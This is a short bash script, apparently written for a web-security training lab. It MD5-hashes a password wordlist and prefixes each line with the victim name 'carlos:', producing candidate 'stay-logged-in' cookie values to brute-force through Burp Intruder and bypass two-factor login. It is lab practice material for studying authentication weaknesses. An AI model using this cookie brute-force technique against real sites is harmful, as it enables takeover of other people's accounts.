#!/bin/bash
# For 2 factor auth bypass lab
# lab had vulnerability in which attacker can simply change an easily decodable cookie named "stay-logged-in" to victim's and get access
# stay-logged-in cookie is b64 encoding of victim-name:md5-of-password

# This is the tool that i've been using for encoding/decoding purposes
echo "[+] Md5 encoder";
echo "[+] Menu loading";
sleep 0.5;
enm=1
while [ $enm -gt 0 ]
do
	count=1
	echo "";
	echo -e "0. single encoder \n1. single encoder(advanced) \n2. mass encoder \n3. remove junk from temp file \n4. clean-up temp file \n0. exit";
	echo "Waiting for your response....";
	read enm;
	sleep 0.5;
	case $enm in
		0) #encodes single string and sends output on console
		echo "";
		echo "ending..";
		sleep 0.5;
		;;
		1) #encodes string one by one dynamically with user input
		echo "";
		while [ $count -gt 0 ]
		do
			echo "Enter your string...";
			read string;
			echo -n $string | md5sum;
			echo "press 0 to go to menu";
			read count;
		done
		;;
		2) #encodes data from the given file at once
		echo "";
		echo "Enter the file name...";
		read fname;
		sleep 0.5;
		echo "reading batch from a file and encoding..."
		while read LINE ; do
		echo -n $LINE | md5sum >> tempoutput.txt; #file containing output
		done < $fname
		echo "done";
		;;
		3) # This is just to remove that weird junk at the end of each line. made this cause i had no idea how remove it easily at the time of making script
		echo "";
		echo "making temp file usable..";
		cat tempoutput.txt | sed 's/...$//' > tempoutput1.txt
		cat tempoutput1.txt > tempoutput.txt
		rm tempoutput1.txt
		cat tempoutput.txt
		cd ..
		;;
		4) # cleaning up outputfile ....for personal use
		echo "this will clean the file.."
		echo "clean-up";
		rm tempoutput.txt
		touch tempoutput.txt
		cd ..
		echo "";
		echo "done";
	esac
done
# this will add carlos: at the prefix of every line in our payload
sed -i -e 's/^/carlos:/' tempoutput.txt
# here we'll end up with md5 hashed passwordlist to bruteforce with "carlos:" prefix in every line
# next step is to b64 encode every data in our payload which can be done with burp intruder

